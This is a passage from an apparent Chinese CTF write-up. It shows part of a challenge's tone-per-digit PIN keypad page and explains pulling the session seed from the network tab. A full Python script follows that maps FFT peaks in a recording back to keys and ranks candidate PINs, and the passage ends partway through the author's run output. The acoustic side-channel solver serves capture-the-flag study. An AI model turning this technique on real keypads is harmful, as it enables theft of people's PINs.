setMsg(&quot;网络错误。&quot;, &quot;bad&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  function mkBtn(label, cls, onClick)&#123;</span><br><span class="line">    const b = document.createElement(&quot;button&quot;);</span><br><span class="line">    b.className = &quot;key &quot; + cls;</span><br><span class="line">    b.textContent = label;</span><br><span class="line">    b.addEventListener(&quot;click&quot;, onClick);</span><br><span class="line">    return b;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  async function init()&#123;</span><br><span class="line">    renderDots();</span><br><span class="line">    setMsg(&quot;初始化会话映射…&quot;, &quot;warn&quot;);</span><br><span class="line">    await fetch(&quot;/init.php&quot;, &#123;cache:&quot;no-store&quot;&#125;).then(r=&gt;r.json());</span><br><span class="line"></span><br><span class="line">    const s = await fetch(&quot;/seed.php&quot;, &#123;cache:&quot;no-store&quot;&#125;).then(r=&gt;r.json());</span><br><span class="line">    if(!s || !s.ok)&#123; setMsg(&quot;seed 获取失败。&quot;, &quot;bad&quot;); return; &#125;</span><br><span class="line"></span><br><span class="line">    seed = s.seed;</span><br><span class="line">    map = await permute_0_9(seed);</span><br><span class="line"></span><br><span class="line">    dl.href = s.record_url;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    kbd.innerHTML = &quot;&quot;;</span><br><span class="line">    const layout = [</span><br><span class="line">      [&quot;1&quot;,&quot;2&quot;,&quot;3&quot;],</span><br><span class="line">      [&quot;4&quot;,&quot;5&quot;,&quot;6&quot;],</span><br><span class="line">      [&quot;7&quot;,&quot;8&quot;,&quot;9&quot;],</span><br><span class="line">      [&quot;cancel&quot;,&quot;0&quot;,&quot;enter&quot;],</span><br><span class="line">    ];</span><br><span class="line">    layout.flat().forEach(x=&gt;&#123;</span><br><span class="line">      if(x===&quot;cancel&quot;) kbd.appendChild(mkBtn(&quot;Cancel&quot;,&quot;fn cancel&quot;,clearPin));</span><br><span class="line">      else if(x===&quot;enter&quot;) kbd.appendChild(mkBtn(&quot;Enter&quot;,&quot;fn enter&quot;,submitPin));</span><br><span class="line">      else &#123;</span><br><span class="line">        const d = Number(x);</span><br><span class="line">        kbd.appendChild(mkBtn(x,&quot;&quot;,()=&gt;pressDigit(d)));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    document.getElementById(&quot;clear&quot;).onclick = clearPin;</span><br><span class="line">    document.getElementById(&quot;test&quot;).onclick = async ()=&gt;&#123;</span><br><span class="line">      setMsg(&quot;依次播放 0-9（当前会话）…&quot;, &quot;warn&quot;);</span><br><span class="line">      for(let d=0; d&lt;=9; d++)&#123;</span><br><span class="line">        await playSoundId(map[d]).catch(()=&gt;&#123;&#125;);</span><br><span class="line">        await new Promise(r=&gt;setTimeout(r, 120));</span><br><span class="line">      &#125;</span><br><span class="line">      setMsg(&quot;播放完成。&quot;, &quot;warn&quot;);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    window.addEventListener(&quot;keydown&quot;, (e)=&gt;&#123;</span><br><span class="line">      if(e.key&gt;=&quot;0&quot; &amp;&amp; e.key&lt;=&quot;9&quot;) pressDigit(Number(e.key));</span><br><span class="line">      if(e.key===&quot;Backspace&quot; || e.key===&quot;Escape&quot;) clearPin();</span><br><span class="line">      if(e.key===&quot;Enter&quot;) submitPin();</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    setMsg(&quot;等待输入 PIN…&quot;, &quot;warn&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  init().catch((e)=&gt;&#123;setMsg(&quot;初始化失败。&quot;,&quot;bad&quot;);console.log(e)&#125;);</span><br><span class="line">&#125;)();</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>在开始之前先F12-&gt;网络-&gt;seed.php找到你的seed,seed才能帮你算出你每个数字对应的频率：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;ok&quot;: true,</span><br><span class="line">    &quot;seed&quot;: &quot;44876bdf5f59431fd93dcda768b6901d&quot;,</span><br><span class="line">    &quot;token&quot;: &quot;8618941989c7f25c778de372835a2403&quot;,</span><br><span class="line">    &quot;record_url&quot;: &quot;\/record.php?token=8618941989c7f25c778de372835a2403&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面是全解密脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">import numpy as np</span><br><span class="line">from scipy.io import wavfile</span><br><span class="line">import os</span><br><span class="line">import itertools</span><br><span class="line">from collections import defaultdict</span><br><span class="line"></span><br><span class="line"># ================= 配置区域 =================</span><br><span class="line"># 填入你最新的 Seed</span><br><span class="line">SEED = &quot;44876bdf5f59431fd93dcda768b6901d&quot;</span><br><span class="line"># 音频文件名</span><br><span class="line">WAV_FILE = &quot;record.wav&quot;</span><br><span class="line"># 预期的 PIN 码长度</span><br><span class="line">TARGET_PIN_LENGTH = 6</span><br><span class="line"># 输出多少个最可能的候选 PIN</span><br><span class="line">CANDIDATE_COUNT = 5</span><br><span class="line"># ### &lt;&lt;&lt; 改进点 &gt;&gt;&gt;</span><br><span class="line"># 当 ENTER 和 CANCEL 误差在此范围内时，优先选择 ENTER</span><br><span class="line">ENTER_BIAS_THRESHOLD_HZ = 3.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ===========================================</span><br><span class="line"></span><br><span class="line"># --- 原始模拟函数 (保持不变) ---</span><br><span class="line">def js_sha256_hex(s):</span><br><span class="line">    return hashlib.sha256(s.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def js_u32_from_hex8(h8):</span><br><span class="line">    b = bytes.fromhex(h8)</span><br><span class="line">    return (b[0] + (b[1] &lt;&lt; 8) + (b[2] &lt;&lt; 16) + (b[3] &lt;&lt; 24))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def prng_u32(seed, tag):</span><br><span class="line">    h = js_sha256_hex(seed + &quot;|&quot; + tag)</span><br><span class="line">    return js_u32_from_hex8(h[:8])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def permute_0_9(seed):</span><br><span class="line">    a = list(range(10))</span><br><span class="line">    x = prng_u32(seed, &quot;perm&quot;)</span><br><span class="line">    for i in range(9, 0, -1):</span><br><span class="line">        x = ((x * 1664525) &amp; 0xFFFFFFFF) + 1013904223</span><br><span class="line">        x = x &amp; 0xFFFFFFFF</span><br><span class="line">        j = x % (i + 1)</span><br><span class="line">        a[i], a[j] = a[j], a[i]</span><br><span class="line">    return a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_expected_freqs(seed):</span><br><span class="line">    mapping = permute_0_9(seed)</span><br><span class="line">    id_to_digit = &#123;v: k for k, v in enumerate(mapping)&#125;</span><br><span class="line">    id_to_digit[10] = &quot;CANCEL&quot;</span><br><span class="line">    id_to_digit[11] = &quot;ENTER&quot;</span><br><span class="line"></span><br><span class="line">    freq_table = &#123;&#125;</span><br><span class="line">    print(f&quot;🔑 正在计算 Seed [&#123;seed[:8]&#125;...] 的频率表:&quot;)</span><br><span class="line">    print(&quot;-&quot; * 40)</span><br><span class="line">    print(f&quot;&#123;&#x27;按键&#x27;:&lt;8&#125; | &#123;&#x27;SoundID&#x27;:&lt;8&#125; | &#123;&#x27;理论频率(Hz)&#x27;:&lt;15&#125;&quot;)</span><br><span class="line">    print(&quot;-&quot; * 40)</span><br><span class="line"></span><br><span class="line">    for sid in range(12):</span><br><span class="line">        x = prng_u32(seed, &quot;p&quot; + str(sid))</span><br><span class="line">        jitter = ((x &amp; 0xff) - 128) * 0.35</span><br><span class="line">        freq = 1050 + sid * 23 + jitter</span><br><span class="line">        digit = id_to_digit.get(sid)</span><br><span class="line">        freq_table[sid] = &#123;&quot;freq&quot;: freq, &quot;key&quot;: str(digit)&#125;</span><br><span class="line">        print(f&quot;[&#123;str(digit):&lt;6&#125;] | &#123;sid:&lt;8&#125; | &#123;freq:.2f&#125;&quot;)</span><br><span class="line">    print(&quot;-&quot; * 40)</span><br><span class="line">    return freq_table</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class DetectedPress:</span><br><span class="line">    def __init__(self, index, peak_freq):</span><br><span class="line">        self.index = index</span><br><span class="line">        self.peak_freq = peak_freq</span><br><span class="line">        self.candidates = []</span><br><span class="line">        self.best_match = None</span><br><span class="line">        self.confidence = 0.0</span><br><span class="line">        self.correction_applied = False  # 标记是否被修正过</span><br><span class="line"></span><br><span class="line">    def calculate_candidates(self, freq_table):</span><br><span class="line">        for sid, info in freq_table.items():</span><br><span class="line">            error = abs(self.peak_freq - info[&#x27;freq&#x27;])</span><br><span class="line">            confidence = 1.0 / (1.0 + error / 10.0)</span><br><span class="line">            self.candidates.append((info[&#x27;key&#x27;], error, confidence))</span><br><span class="line"></span><br><span class="line">        self.candidates.sort(key=lambda x: x[1])  # 按误差升序排序</span><br><span class="line"></span><br><span class="line">        # ### &lt;&lt;&lt; 改进点: 优先选择 ENTER 的逻辑 &gt;&gt;&gt;</span><br><span class="line">        # 检查最佳匹配是否为 CANCEL，次佳是否为 ENTER</span><br><span class="line">        if len(self.candidates) &gt; 1:</span><br><span class="line">            best_match, best_error, _ = self.candidates[0]</span><br><span class="line">            second_match, second_error, _ = self.candidates[1]</span><br><span class="line"></span><br><span class="line">            # 如果最佳是CANCEL，次佳是ENTER，且误差差异不大</span><br><span class="line">            if best_match == &#x27;CANCEL&#x27; and second_match == &#x27;ENTER&#x27; and \</span><br><span class="line">                    abs(best_error - second_error) &lt; ENTER_BIAS_THRESHOLD_HZ:</span><br><span class="line">                # 交换它们！优先选择 ENTER</span><br><span class="line">                self.candidates[0], self.candidates[1] = self.candidates[1], self.candidates[0]</span><br><span class="line">                self.correction_applied = True  # 标记此修正</span><br><span class="line"></span><br><span class="line">        # 更新最终选择</span><br><span class="line">        if self.candidates:</span><br><span class="line">            self.best_match = self.candidates[0][0]</span><br><span class="line">            self.confidence = self.candidates[0][2]</span><br><span class="line"></span><br><span class="line">    def __repr__(self):</span><br><span class="line">        return (f&quot;Press(idx=&#123;self.index&#125;, key=&#x27;&#123;self.best_match&#125;&#x27;, &quot;</span><br><span class="line">                f&quot;conf=&#123;self.confidence:.2f&#125;, peak=&#123;self.peak_freq:.2f&#125;Hz)&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def analyze_audio_to_presses(filepath, freq_table):</span><br><span class="line">    if not os.path.exists(filepath):</span><br><span class="line">        print(f&quot;❌ 错误: 找不到文件 &#123;filepath&#125;&quot;)</span><br><span class="line">        return []</span><br><span class="line"></span><br><span class="line">    print(f&quot;\n🎧 正在分析音频: &#123;filepath&#125; ...&quot;)</span><br><span class="line">    try:</span><br><span class="line">        samplerate, data = wavfile.read(filepath)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;❌ 读取音频失败: &#123;e&#125;&quot;)</span><br><span class="line">        return []</span><br><span class="line"></span><br><span class="line">    if len(data.shape) &gt; 1: data = data[:, 0]</span><br><span class="line"></span><br><span class="line">    window_size, threshold_factor, min_duration = 1024, 0.2, 2000</span><br><span class="line">    threshold = np.max(np.abs(data)) * threshold_factor</span><br><span class="line">    active_regions = []</span><br><span class="line">    in_region, start_idx = False, 0</span><br><span class="line">    for i in range(0, len(data), window_size):</span><br><span class="line">        chunk = data[i:i + window_size]</span><br><span class="line">        if np.max(np.abs(chunk)) &gt; threshold:</span><br><span class="line">            if not in_region:</span><br><span class="line">                start_idx = i</span><br><span class="line">                in_region = True</span><br><span class="line">        elif in_region:</span><br><span class="line">            if i - start_idx &gt; min_duration:</span><br><span class="line">                active_regions.append((start_idx, i))</span><br><span class="line">            in_region = False</span><br><span class="line"></span><br><span class="line">    if in_region and len(data) - start_idx &gt; min_duration:</span><br><span class="line">        active_regions.append((start_idx, len(data)))</span><br><span class="line"></span><br><span class="line">    detected_presses = []</span><br><span class="line">    print(&quot;\n👇 识别到的原始按键信号:&quot;)</span><br><span class="line">    for i, (start, end) in enumerate(active_regions):</span><br><span class="line">        segment = data[start:end] * np.hanning(end - start)</span><br><span class="line">        fft_out = np.fft.rfft(segment)</span><br><span class="line">        freqs = np.fft.rfftfreq(len(segment), 1.0 / samplerate)</span><br><span class="line"></span><br><span class="line">        idx = np.argmax(np.abs(fft_out))</span><br><span class="line">        peak_freq = freqs[idx]</span><br><span class="line"></span><br><span class="line">        press = DetectedPress(index=i, peak_freq=peak_freq)</span><br><span class="line">        press.calculate_candidates(freq_table)</span><br><span class="line">        detected_presses.append(press)</span><br><span class="line"></span><br><span class="line">        # 打印更丰富的调试信息</span><br><span class="line">        print(f&quot;  🎵 信号 &#123;i&#125;: &#123;peak_freq:.2f&#125; Hz&quot;)</span><br><span class="line"></span><br><span class="line">        # ### &lt;&lt;&lt; 改进点: 如果发生了修正，明确地打印出来 &gt;&gt;&gt;</span><br><span class="line">        if press.correction_applied:</span><br><span class="line">            original_best, original_err, _ = press.candidates[1]  # 原来的最佳现在是老二</span><br><span class="line">            corrected_best, corrected_err, _ = press.candidates[0]  # 现在的老大</span><br><span class="line">            print(f&quot;     - ⚠️ 智能修正: 从 [&#123;original_best&#125;] (误差 &#123;original_err:.2f&#125;Hz) &quot;</span><br><span class="line">                  f&quot;修正为 [&#123;corrected_best&#125;] (误差 &#123;corrected_err:.2f&#125;Hz)&quot;)</span><br><span class="line">        else:</span><br><span class="line">            best_key, error, conf = press.candidates[0]</span><br><span class="line">            second_best_key, second_error, _ = press.candidates[1]</span><br><span class="line">            print(f&quot;     - 最佳匹配: [&#123;best_key&#125;] (误差 &#123;error:.2f&#125;Hz, 置信度 &#123;conf:.2f&#125;)&quot;)</span><br><span class="line">            print(f&quot;     - 次佳匹配: [&#123;second_best_key&#125;] (误差 &#123;second_error:.2f&#125;Hz)&quot;)</span><br><span class="line"></span><br><span class="line">    return detected_presses</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># --- generate_candidates 和 solve 函数保持不变 ---</span><br><span class="line"># (因为我们修正了输入数据，下游算法不需要改动)</span><br><span class="line"></span><br><span class="line">def generate_candidates(session, target_len):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    根据启发式规则生成候选 PIN</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    candidates = defaultdict(lambda: &#123;&quot;score&quot;: 0, &quot;reason&quot;: &quot;&quot;&#125;)</span><br><span class="line">    session_len = len(session)</span><br><span class="line"></span><br><span class="line">    if session_len &gt; target_len:</span><br><span class="line">        num_to_delete = session_len - target_len</span><br><span class="line">        sorted_session = sorted(session, key=lambda p: p.confidence)</span><br><span class="line">        to_delete = sorted_session[:num_to_delete]</span><br><span class="line">        to_keep = sorted(set(session) - set(to_delete), key=lambda p: p.index)</span><br><span class="line">        pin = &quot;&quot;.join([p.best_match for p in to_keep])</span><br><span class="line">        score = np.mean([p.confidence for p in to_keep])</span><br><span class="line">        if score &gt; candidates[pin][&quot;score&quot;]:</span><br><span class="line">            candidates[pin] = &#123;&quot;score&quot;: score, &quot;reason&quot;: f&quot;剔除 &#123;num_to_delete&#125; 个低置信度按键&quot;&#125;</span><br><span class="line"></span><br><span class="line">    low_conf_presses = sorted(session, key=lambda p: p.confidence)[:3]</span><br><span class="line">    for press_to_correct in low_conf_presses:</span><br><span class="line">        temp_session = list(session)</span><br><span class="line">        corrected_press_idx = session.index(press_to_correct)</span><br><span class="line">        if len(press_to_correct.candidates) &lt; 2: continue</span><br><span class="line"></span><br><span class="line">        corrected_key, _, corrected_confidence = press_to_correct.candidates[1]</span><br><span class="line"></span><br><span class="line">        corrected_press = DetectedPress(press_to_correct.index, press_to_correct.peak_freq)</span><br><span class="line">        corrected_press.best_match = corrected_key</span><br><span class="line">        corrected_press.confidence = corrected_confidence</span><br><span class="line"></span><br><span class="line">        temp_session[corrected_press_idx] = corrected_press</span><br><span class="line"></span><br><span class="line">        if len(temp_session) == target_len:</span><br><span class="line">            pin = &quot;&quot;.join([p.best_match for p in temp_session])</span><br><span class="line">            score = np.mean([p.confidence for p in temp_session])</span><br><span class="line">            if score &gt; candidates[pin][&quot;score&quot;]:</span><br><span class="line">                candidates[pin] = &#123;&quot;score&quot;: score,</span><br><span class="line">                                   &quot;reason&quot;: f&quot;修正按键 &#123;press_to_correct.index&#125; (从 &#123;press_to_correct.best_match&#125; -&gt; &#123;corrected_key&#125;)&quot;&#125;</span><br><span class="line"></span><br><span class="line">        elif len(temp_session) &gt; target_len:</span><br><span class="line">            num_to_delete = len(temp_session) - target_len</span><br><span class="line">            sorted_temp = sorted(temp_session, key=lambda p: p.confidence)</span><br><span class="line">            to_delete = sorted_temp[:num_to_delete]</span><br><span class="line">            to_keep = sorted(set(temp_session) - set(to_delete), key=lambda p: p.index)</span><br><span class="line">            pin = &quot;&quot;.join([p.best_match for p in to_keep])</span><br><span class="line">            score = np.mean([p.confidence for p in to_keep])</span><br><span class="line">            if score &gt; candidates[pin][&quot;score&quot;]:</span><br><span class="line">                candidates[pin] = &#123;&quot;score&quot;: score,</span><br><span class="line">                                   &quot;reason&quot;: f&quot;修正按键 &#123;press_to_correct.index&#125; + 剔除 &#123;num_to_delete&#125; 个&quot;&#125;</span><br><span class="line"></span><br><span class="line">    if session_len == target_len:</span><br><span class="line">        pin = &quot;&quot;.join([p.best_match for p in session])</span><br><span class="line">        score = np.mean([p.confidence for p in session])</span><br><span class="line">        if score &gt; candidates[pin][&quot;score&quot;]:</span><br><span class="line">            candidates[pin] = &#123;&quot;score&quot;: score, &quot;reason&quot;: &quot;原始识别序列&quot;&#125;</span><br><span class="line"></span><br><span class="line">    return candidates</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def solve():</span><br><span class="line">    ref_table = get_expected_freqs(SEED)</span><br><span class="line">    presses = analyze_audio_to_presses(WAV_FILE, ref_table)</span><br><span class="line"></span><br><span class="line">    if not presses:</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    sessions = []</span><br><span class="line">    current_session = []</span><br><span class="line">    for press in presses:</span><br><span class="line">        if press.best_match == &#x27;ENTER&#x27;:</span><br><span class="line">            if current_session:</span><br><span class="line">                sessions.append(current_session)</span><br><span class="line">            current_session = []</span><br><span class="line">        elif press.best_match != &#x27;CANCEL&#x27;:</span><br><span class="line">            current_session.append(press)</span><br><span class="line">    if current_session:</span><br><span class="line">        sessions.append(current_session)</span><br><span class="line"></span><br><span class="line">    print(&quot;\n&quot; + &quot;=&quot; * 30)</span><br><span class="line">    print(&quot;🧠 正在进行智能推理...&quot;)</span><br><span class="line">    print(&quot;=&quot; * 30)</span><br><span class="line"></span><br><span class="line">    all_candidates = &#123;&#125;</span><br><span class="line">    for i, session in enumerate(sessions):</span><br><span class="line">        if not session: continue</span><br><span class="line"></span><br><span class="line">        raw_keys = &quot; &quot;.join([p.best_match for p in session])</span><br><span class="line">        print(f&quot;\n分析会话 &#123;i + 1&#125; (长度 &#123;len(session)&#125;): [&#123;raw_keys&#125;]&quot;)</span><br><span class="line"></span><br><span class="line">        session_candidates = generate_candidates(session, TARGET_PIN_LENGTH)</span><br><span class="line">        for pin, info in session_candidates.items():</span><br><span class="line">            if info[&quot;score&quot;] &gt; all_candidates.get(pin, &#123;&quot;score&quot;: -1&#125;)[&quot;score&quot;]:</span><br><span class="line">                all_candidates[pin] = info</span><br><span class="line"></span><br><span class="line">    if not all_candidates:</span><br><span class="line">        print(&quot;\n❌ 未能生成任何长度合理的候选 PIN。&quot;)</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    sorted_pins = sorted(all_candidates.items(), key=lambda item: item[1][&#x27;score&#x27;], reverse=True)</span><br><span class="line"></span><br><span class="line">    print(&quot;\n&quot; + &quot;=&quot; * 40)</span><br><span class="line">    print(&quot;🎉 最终候选 PIN 码 (按可能性排序):&quot;)</span><br><span class="line">    print(&quot;=&quot; * 40)</span><br><span class="line">    for i, (pin, info) in enumerate(sorted_pins[:CANDIDATE_COUNT]):</span><br><span class="line">        print(f&quot;#&#123;i + 1&#125;: &#123;pin&#125;&quot;)</span><br><span class="line">        print(f&quot;   - 置信度: &#123;info[&#x27;score&#x27;]:.3f&#125;&quot;)</span><br><span class="line">        print(f&quot;   - 推理依据: &#123;info[&#x27;reason&#x27;]&#125;&quot;)</span><br><span class="line">        print(&quot;-&quot; * 20)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    solve()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这个脚本有瑕疵，他确实会把你用seed计算的频率和从wav中识别的频率进行对比但是对cancel和enter的处理不好请运行完脚本后人工处理，例如我的运行结果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">D:\py\python.exe C:\Users\Lenovo\Desktop\ctf\rsa_xor_decrypt.py </span><br><span class="line">🔑 正在计算 Seed [44876bdf...] 的频率表:</span><br><span class="line">----------------------------------------</span><br><span class="line">按键       | SoundID  | 理论频率(Hz)       </span><br><span class="line">----------------------------------------</span><br><span class="line">[4     ] | 0        | 1008.00</span><br><span class="line">[9     ] | 1        | 1044.30</span><br><span 